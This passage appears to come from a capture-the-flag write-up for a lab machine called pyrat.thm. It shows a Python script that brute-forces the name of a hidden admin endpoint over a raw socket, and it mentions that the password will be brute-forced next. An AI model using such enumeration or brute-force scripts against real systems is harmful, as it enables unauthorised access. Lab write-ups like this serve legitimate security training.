The code suggests a hidden admin endpoint that allows shell access. I write a script to brute-force the endpoint name:
```python
import socket
import sys

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <wordlist>")
    exit()
    
with open(sys.argv[1]) as f:
    endpoints = [line for line in f.read().splitlines() if line and not line.startswith("#")]
    
for endpoint in endpoints:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(("pyrat.thm", 8000))
        s.sendall(endpoint.encode() + b"\n")
        resp = s.recv(1024).decode()
        if "is not defined" not in resp:
            print(endpoint)
```
Once the correct endpoint is found, it prompts for a password. I brute-force that next:
